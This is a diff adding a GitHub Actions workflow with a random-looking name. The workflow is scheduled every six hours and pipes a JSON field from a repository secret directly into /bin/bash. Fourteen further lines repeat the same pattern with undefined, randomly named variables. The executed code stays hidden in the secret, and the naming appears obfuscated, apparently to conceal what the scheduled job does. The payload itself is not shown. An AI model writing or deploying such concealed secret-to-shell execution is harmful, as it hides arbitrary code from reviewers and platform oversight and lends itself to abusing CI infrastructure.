@@ -1,0 +1,31 @@
+name: qianlongdidabeij
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianlongdidabeij
+        env:
+          ur32603: ${{ secrets.ur32603 }}
+        run: |
+          echo $ur32603 | jq -r .kyzk202 | /bin/bash
+          echo $unun495 | jq -r .l753 | /bin/bash
+          echo $i35519 | jq -r .kqis0 | /bin/bash
+          echo $tcxn5887 | jq -r .wy83308 | /bin/bash
+          echo $rk4 | jq -r .ej44 | /bin/bash
+          echo $yqlng09 | jq -r .a9371 | /bin/bash
+          echo $na14769 | jq -r .jnw985 | /bin/bash
+          echo $pxqh2614 | jq -r .fpjb2 | /bin/bash
+          echo $djg4369 | jq -r .mx002 | /bin/bash
+          echo $zuei9711 | jq -r .rh329 | /bin/bash
+          echo $k384 | jq -r .er49628 | /bin/bash
+          echo $gfew517 | jq -r .bmy30026 | /bin/bash
+          echo $kxni308 | jq -r .bzmlv95232 | /bin/bash
+          echo $ecxs04 | jq -r .zzcc60641 | /bin/bash
+          echo $mbgcn4214 | jq -r .fn7274 | /bin/bash
+
